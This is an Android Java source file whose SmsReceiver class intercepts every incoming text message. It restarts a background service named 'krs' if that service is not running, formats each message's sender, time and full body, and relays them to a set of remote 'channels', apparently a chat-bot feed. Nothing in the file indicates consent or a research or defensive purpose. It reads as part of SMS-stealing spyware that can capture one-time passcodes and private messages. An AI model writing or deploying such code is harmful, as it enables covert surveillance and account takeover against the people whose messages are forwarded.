package com.tenix.karasu;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        if (krs.instance == null) {
            Intent s = new Intent(ctx, krs.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(s);
            else ctx.startService(s);
            return;
        }

        Bundle b = intent.getExtras();
        if (b == null) return;

        Object[] pdus = (Object[]) b.get("pdus");
        if (pdus == null) return;

        String format = b.getString("format");
        StringBuilder sb = new StringBuilder("💬 *Incoming SMS*\n");

        for (Object pdu : pdus) {
            SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu, format);
            if (msg == null) continue;

            String from = msg.getOriginatingAddress();
            String body = msg.getMessageBody();
            long   time = msg.getTimestampMillis();

            String timeStr = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date(time));
            sb.append("From: ").append(from).append("\n")
              .append("Time: ").append(timeStr).append("\n")
              .append("Text: ").append(body).append("\n");
        }

        for (String ch : krs.instance.parseChannels()) {
            krs.instance.sendText(sb.toString(), ch);
        }
    }
}
